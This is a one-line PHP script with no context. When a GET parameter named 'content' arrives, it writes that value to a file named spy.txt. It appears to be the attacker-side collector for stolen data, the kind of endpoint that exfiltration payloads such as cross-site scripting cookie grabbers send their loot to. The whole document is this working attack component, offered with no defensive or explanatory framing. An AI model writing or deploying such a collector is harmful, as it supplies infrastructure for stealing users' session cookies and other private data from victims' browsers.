<?php if (isset($_GET['content'])) { $fl = fopen("./spy.txt", "w"); if ($fl) { fputs($fl, $_GET['content']); } fclose($fl); } ?>